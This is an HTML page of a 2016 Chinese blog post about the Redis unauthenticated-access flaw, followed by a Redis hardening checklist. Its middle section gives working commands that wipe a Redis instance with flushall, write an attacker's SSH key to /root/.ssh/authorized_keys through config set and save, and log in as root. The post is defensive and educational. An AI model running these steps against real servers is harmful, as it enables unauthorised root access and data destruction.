@@ -1,0 +1,748 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Redis Sec," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="今天" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="去年11月初Redis爆出安全漏洞，远程连接redis在满足一定条件下，可控制redis服务器root权限。最近又有小伙伴中招； 本文介绍这个漏洞的细节和Redis的基本安全规范。
+
+Redis漏洞背景去年11月antirez（redis’s father）在他博客A few things about Redis security一文详细说明这个问题。暴露的公网(或无访问控制)的redis实例，如">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一个Redis安全漏洞和Redis安全规范">
+<meta property="og:url" content="http://yoursite.com/2016/07/29/redis-sec/index.html">
+<meta property="og:site_name" content="今天">
+<meta property="og:description" content="去年11月初Redis爆出安全漏洞，远程连接redis在满足一定条件下，可控制redis服务器root权限。最近又有小伙伴中招； 本文介绍这个漏洞的细节和Redis的基本安全规范。
+
+Redis漏洞背景去年11月antirez（redis’s father）在他博客A few things about Redis security一文详细说明这个问题。暴露的公网(或无访问控制)的redis实例，如">
+<meta property="og:updated_time" content="2016-08-09T13:13:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一个Redis安全漏洞和Redis安全规范">
+<meta name="twitter:description" content="去年11月初Redis爆出安全漏洞，远程连接redis在满足一定条件下，可控制redis服务器root权限。最近又有小伙伴中招； 本文介绍这个漏洞的细节和Redis的基本安全规范。
+
+Redis漏洞背景去年11月antirez（redis’s father）在他博客A few things about Redis security一文详细说明这个问题。暴露的公网(或无访问控制)的redis实例，如">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 6316444262204442000,
+      author: '今天'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/07/29/redis-sec/"/>
+
+  <title> 记一个Redis安全漏洞和Redis安全规范 | 今天 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">今天</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            书单
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                记一个Redis安全漏洞和Redis安全规范
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-29T13:15:33+08:00" content="2016-07-29">
+              2016-07-29
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Redis/" itemprop="url" rel="index">
+                    <span itemprop="name">Redis</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/29/redis-sec/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/29/redis-sec/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+              &nbsp; | &nbsp;
+              <span class="page-pv"><i class="fa fa-file-o"></i>
+              <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+              </span>
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>去年11月初Redis爆出安全漏洞，远程连接redis在满足一定条件下，可控制redis服务器root权限。最近又有小伙伴中招； 本文介绍这个漏洞的细节和Redis的基本安全规范。</p>
+<hr>
+<h2 id="Redis漏洞背景"><a href="#Redis漏洞背景" class="headerlink" title="Redis漏洞背景"></a>Redis漏洞背景</h2><p>去年11月antirez（redis’s father）在他博客<a href="http://antirez.com/news/96" target="_blank" rel="external">A few things about Redis security</a>一文详细说明这个问题。暴露的公网(或无访问控制)的redis实例，如果是无或弱密码设置，并且未对config,flushall,[bg]save命令未rename。可以被攻击者通过写redis RDB文件的方式来写SSH公钥，然后可以登陆redis服务器，获得root权限。</p>
+<h2 id="利用漏洞获取root过程模拟"><a href="#利用漏洞获取root过程模拟" class="headerlink" title="利用漏洞获取root过程模拟"></a>利用漏洞获取root过程模拟</h2><p>场景：攻击者所在sec-client外部服务器，探测到有公网的sec-redis.bj服务器，有一个无密码设置6379的redis实例。攻击者通过连接redis实例，最后获取redis服务器的root权限。<br>现在攻击者在client服务器不能登陆redis服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[zhuo@sec-client ~]$ ssh root@sec-redis.bj</div><div class="line">root@sec-redis.bj&apos;s password:</div><div class="line">Permission denied, please try again.</div></pre></td></tr></table></figure></p>
+<h3 id="client服务器，生成公钥"><a href="#client服务器，生成公钥" class="headerlink" title="client服务器，生成公钥"></a>client服务器，生成公钥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">[zhuo@sec-client ~]$ ssh-keygen -t rsa</div><div class="line">Generating public/private rsa key pair.</div><div class="line">Enter file in which to save the key (/home/zhuo/.ssh/id_rsa):</div><div class="line">Enter passphrase (empty for no passphrase):</div><div class="line">Enter same passphrase again:</div><div class="line">Your identification has been saved in /home/zhuo/.ssh/id_rsa.</div><div class="line">Your public key has been saved in /home/zhuo/.ssh/id_rsa.pub.</div><div class="line">The key fingerprint is:</div><div class="line">ef:b9:f5:34:a6:f4:62:fc:19:f6:46:17:ac:45:3e:72 zhuo@sec-client.bj</div><div class="line">The key&apos;s randomart image is:</div><div class="line">+--[ RSA 2048]----+</div><div class="line">|                 |</div><div class="line">|               . |</div><div class="line">|              +  |</div><div class="line">|             . E |</div><div class="line">|        S     = o|</div><div class="line">|         .   .  o|</div><div class="line">|          ..o *..|</div><div class="line">|         . ++B =.|</div><div class="line">|          +o.o=..|</div><div class="line">+-----------------+</div></pre></td></tr></table></figure>
+<p>把client的公钥写入文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$cd ~/.ssh/</div><div class="line">$(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; rediskey.txt</div></pre></td></tr></table></figure></p>
+<h3 id="把client的公钥写入redis服务器-root-ssh-authorized-keys，获取root权限"><a href="#把client的公钥写入redis服务器-root-ssh-authorized-keys，获取root权限" class="headerlink" title="把client的公钥写入redis服务器/root/.ssh/authorized_keys，获取root权限"></a>把client的公钥写入redis服务器/root/.ssh/authorized_keys，获取root权限</h3><p>清理redis的所有数据（再次强调，别在生产环境尝试）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ redis-cli  -h sec-redis.bj -p 6379 flushall</div><div class="line">OK</div></pre></td></tr></table></figure></p>
+<p>把client处理过的公钥文件rediskey.txt，写入redis的个字符串key中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cat rediskey.txt | redis-cli  -h sec-redis.bj -p 6379 -x set dangerkey  </div><div class="line">OK</div></pre></td></tr></table></figure></p>
+<p>修改redis的dir目录设置，和rdb文件的名字dbfilename; 以达到save的rdb文件覆盖写入redis服务器的/root/.ssh/authorized_keys文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ redis-cli  -h sec-redis.bj -p 6379</div><div class="line">sec-redis.bj:6379&gt; config set dir /root/.ssh/</div><div class="line">OK</div><div class="line">sec-redis.bj:6379&gt; config set dbfilename &quot;authorized_keys&quot;</div><div class="line">OK</div><div class="line">sec-redis.bj:6379&gt; save</div><div class="line">OK</div><div class="line">sec-redis.bj:6379&gt;</div></pre></td></tr></table></figure></p>
+<h3 id="完成root权限获取"><a href="#完成root权限获取" class="headerlink" title="完成root权限获取"></a>完成root权限获取</h3><p>攻击者可从client登录redis服务器，已获取root权限。当然使用其他账号启动，也存在类似问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[zhuo@sec-client .ssh]$ hostname</div><div class="line">sec-client.bj</div><div class="line">[zhuo@sec-client .ssh]$ ssh root@sec-redis.bj</div><div class="line">Last login: Mon Jun  6 16:11:35 2016 from xx.xx.xx</div><div class="line">[root@c3-sec-redis ~]# hostname</div><div class="line">sec-redis.bj</div></pre></td></tr></table></figure></p>
+<h3 id="满足以下条件Redis实例存在此安全隐患"><a href="#满足以下条件Redis实例存在此安全隐患" class="headerlink" title="满足以下条件Redis实例存在此安全隐患"></a>满足以下条件Redis实例存在此安全隐患</h3><ul>
+<li>Redis使用root用户启动</li>
+<li>Redis未设置密码或密码过于简单</li>
+<li>Redis未重命名或禁用config, flushdb/flushall,[bg]save等命令</li>
+</ul>
+<p>加强Redis的安全性，提供以下安全规范。</p>
+<h2 id="Redis安全规范"><a href="#Redis安全规范" class="headerlink" title="Redis安全规范"></a>Redis安全规范</h2><p>这里列举Redis使用的安全check list.</p>
+<h3 id="信任的内网运行，尽量避免有公网访问"><a href="#信任的内网运行，尽量避免有公网访问" class="headerlink" title="信任的内网运行，尽量避免有公网访问"></a>信任的内网运行，尽量避免有公网访问</h3><p>redis自身只有一个密码控制访问，不能设置用户权限和IP限制。理论把redis运行在一个信任的网络环境中。</p>
+<h3 id="绑定Redis监听的网络接口"><a href="#绑定Redis监听的网络接口" class="headerlink" title="绑定Redis监听的网络接口"></a>绑定Redis监听的网络接口</h3><p>如果服务器有多个IP,可限定redis server监听的IP; 通过redis配置项bind，可同时绑定多个IP.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># By default, if no "bind" configuration directive is specified, Redis listens</span></div><div class="line"><span class="comment"># for connections from all the network interfaces available on the server.</span></div><div class="line"><span class="comment"># It is possible to listen to just one or multiple selected interfaces using</span></div><div class="line"><span class="comment"># the "bind" configuration directive, followed by one or more IP addresses.</span></div></pre></td></tr></table></figure></p>
+<h3 id="禁止root用户启动redis"><a href="#禁止root用户启动redis" class="headerlink" title="禁止root用户启动redis"></a>禁止root用户启动redis</h3><p>使用普通用户启动，安全性往往高很多；<br>业务程序永久别用root用户运行。</p>
+<h3 id="限制redis文件目录访问权限"><a href="#限制redis文件目录访问权限" class="headerlink" title="限制redis文件目录访问权限"></a>限制redis文件目录访问权限</h3><p>设置redis的主目录权限为700；如果redis配置文件独立于redis主目录，权限修改为600，因为Redis密码明文存储在配置文件中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$chmod</span> 700 /var/lib/redis   <span class="comment">#假设这是你redis目录</span></div><div class="line"><span class="variable">$chmod</span> 600 /etc/redis/redis.conf  <span class="comment">#假设这是你redis配置文件</span></div></pre></td></tr></table></figure></p>
+<h3 id="避免使用熟知端口"><a href="#避免使用熟知端口" class="headerlink" title="避免使用熟知端口"></a>避免使用熟知端口</h3><p>程序运行尽量避免使用熟知端口，降低被初级扫描的风险。</p>
+<h3 id="开启Redis密码认证，并设置高复杂度密码"><a href="#开启Redis密码认证，并设置高复杂度密码" class="headerlink" title="开启Redis密码认证，并设置高复杂度密码"></a>开启Redis密码认证，并设置高复杂度密码</h3><p>redis在redis.conf配置文件中，设置配置项requirepass， 开户密码认证。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$vim</span> /etc/redis/redis.conf  </div><div class="line">requirepass ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815</div></pre></td></tr></table></figure></p>
+<p>redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。<br>requirepass至少长度20位以上，为方便可使用一个特殊串sha256sum命令生成64位的无特殊字符串。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$echo</span> <span class="string">"dfasdERQEWRQEW31341dfadsfadsf"</span> | sha256sum</div><div class="line">af970b3691a0774b2a5adae1375e14<span class="built_in">cd</span>9e5db3591564f0eb789c2324cc02362f  -</div></pre></td></tr></table></figure></p>
+<h3 id="禁用或重命名危险命令"><a href="#禁用或重命名危险命令" class="headerlink" title="禁用或重命名危险命令"></a>禁用或重命名危险命令</h3><p>这个漏洞就利用config/save两个命令完成攻击 。 因redis无用户权限限制，建议危险的命令，使用rename配置项进行禁用或重命名，这样外部不了解重命名规则攻击者，就不能执行这类命令。<br>以下示例：redis.config文件禁用FLUSHDB、FLUSHALL两个命令；重命名CONFIG、SHUTDOWN命令，<br>添加一个特殊的后缀。 这样redis启动后，只能运行CONFIG_b9fc8327c4dee7命令，不能执行CONFIG命令。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># It is also possible to completely kill a command by renaming it into</span></div><div class="line"><span class="comment"># an empty string:</span></div><div class="line"><span class="comment">#</span></div><div class="line">rename-command CONFIG CONFIG_b9<span class="built_in">fc</span>8327c4dee7</div><div class="line">rename-command SHUTDOWN SHUTDOWN_b9<span class="built_in">fc</span>8327c4dee7</div><div class="line">rename-command FLUSHDB <span class="string">""</span></div><div class="line">rename-command FLUSHALL <span class="string">""</span></div></pre></td></tr></table></figure></p>
+<h3 id="禁止Redis中存储敏感的明文数据"><a href="#禁止Redis中存储敏感的明文数据" class="headerlink" title="禁止Redis中存储敏感的明文数据"></a>禁止Redis中存储敏感的明文数据</h3><p>Redis设计旨在提供高性能的KV服务，至少目前在权限访问控制和数据持久化方面比较弱化。所以禁止在Redis中存储或缓存，<br>敏感的明文数据。</p>
+<h3 id="安全监控"><a href="#安全监控" class="headerlink" title="安全监控"></a>安全监控</h3><ul>
+<li>建立<a href="http://drops.wooyun.org/papers/5968" target="_blank" rel="external">蜜罐网络</a>，有攻击尝试时，可及时发现。</li>
+<li>监控redis安全状态，cmdstat_auth cmdstat_flushdb/flushall监控报警。</li>
+</ul>
+<h2 id="Redis-Cluster不支持密码问题"><a href="#Redis-Cluster不支持密码问题" class="headerlink" title="Redis Cluster不支持密码问题"></a>Redis Cluster不支持密码问题</h2><p><a href="http://redis.io/topics/cluster-spec" target="_blank" rel="external">Redis 原生Cluster模式</a>最新3.2版本都不支持开启密码认证。<br>业内很多公司内网使用Cluster只能无密；目前通过前面其他安全设置项来保证，内网Redis Cluster的安全性。<br>至于未来希望Redis Cluster整个集群实例能支持同一个密码。社区之前对Redis他爸antirez提过，他<a href="https://groups.google.com/forum/#!msg/redis-db/Z8lMxTfDct8/Rny9BIK9xGYJ" target="_blank" rel="external">答复暂不支持</a>。</p>
+<h2 id="Redis3-2的保护模式"><a href="#Redis3-2的保护模式" class="headerlink" title="Redis3.2的保护模式"></a>Redis3.2的保护模式</h2><p>针对之前Redis版本，默认无bind和密码设置存在很大安全风险；Redis3.2版本提出新特性protected mode(保护模式)。<br>如果Redis在启动时，未开启bind和密码设置功能，只能通过回环地址本地访问，如果尝试远程访问redis，会提示以下错误：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">DENIED Redis is running protected mode because protected mode is enabled,</div><div class="line">no <span class="built_in">bind</span> address was specified, no authentication password is requested to clients.</div><div class="line">In this mode connections are only accepted from the loopback interface.</div></pre></td></tr></table></figure></p>
+<p>当然也可直接执行CONFIG SET protected-mode no，关闭保护模式。<br>类似这种设置在MongoDB3.2或MySQL5.7的默认安全配置都有。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Redis-Sec/" rel="tag">#Redis Sec</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/07/30/redis-client-two-buffers/" rel="prev" title="Redis Client query buffer and output buffer">
+                Redis Client query buffer and output buffer <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/07/29/redis-sec/"
+           data-title="记一个Redis安全漏洞和Redis安全规范" data-url="http://yoursite.com/2016/07/29/redis-sec/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="Roger Zhuo" />
+          <p class="site-author-name" itemprop="name">Roger Zhuo</p>
+          <p class="site-description motion-element" itemprop="description">汝林的Blog</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">5</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/ZhuoRoger" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/2540962412" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  微博
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.percona.com/blog/" title="Percona" target="_blank">Percona</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis漏洞背景"><span class="nav-number">1.</span> <span class="nav-text">Redis漏洞背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用漏洞获取root过程模拟"><span class="nav-number">2.</span> <span class="nav-text">利用漏洞获取root过程模拟</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#client服务器，生成公钥"><span class="nav-number">2.1.</span> <span class="nav-text">client服务器，生成公钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#把client的公钥写入redis服务器-root-ssh-authorized-keys，获取root权限"><span class="nav-number">2.2.</span> <span class="nav-text">把client的公钥写入redis服务器/root/.ssh/authorized_keys，获取root权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#完成root权限获取"><span class="nav-number">2.3.</span> <span class="nav-text">完成root权限获取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#满足以下条件Redis实例存在此安全隐患"><span class="nav-number">2.4.</span> <span class="nav-text">满足以下条件Redis实例存在此安全隐患</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis安全规范"><span class="nav-number">3.</span> <span class="nav-text">Redis安全规范</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信任的内网运行，尽量避免有公网访问"><span class="nav-number">3.1.</span> <span class="nav-text">信任的内网运行，尽量避免有公网访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绑定Redis监听的网络接口"><span class="nav-number">3.2.</span> <span class="nav-text">绑定Redis监听的网络接口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#禁止root用户启动redis"><span class="nav-number">3.3.</span> <span class="nav-text">禁止root用户启动redis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#限制redis文件目录访问权限"><span class="nav-number">3.4.</span> <span class="nav-text">限制redis文件目录访问权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#避免使用熟知端口"><span class="nav-number">3.5.</span> <span class="nav-text">避免使用熟知端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开启Redis密码认证，并设置高复杂度密码"><span class="nav-number">3.6.</span> <span class="nav-text">开启Redis密码认证，并设置高复杂度密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#禁用或重命名危险命令"><span class="nav-number">3.7.</span> <span class="nav-text">禁用或重命名危险命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#禁止Redis中存储敏感的明文数据"><span class="nav-number">3.8.</span> <span class="nav-text">禁止Redis中存储敏感的明文数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安全监控"><span class="nav-number">3.9.</span> <span class="nav-text">安全监控</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis-Cluster不支持密码问题"><span class="nav-number">4.</span> <span class="nav-text">Redis Cluster不支持密码问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis3-2的保护模式"><span class="nav-number">5.</span> <span class="nav-text">Redis3.2的保护模式</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Roger Zhuo</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+        
+
+<div class="busuanzi-count">
+
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv"><i class="fa fa-user"></i><span class="busuanzi-value" id="busuanzi_value_site_uv"></span></span>
+  
+
+  
+    <span class="site-pv"><i class="fa fa-eye"></i><span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span>
+  
+  
+</div>
+
+
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
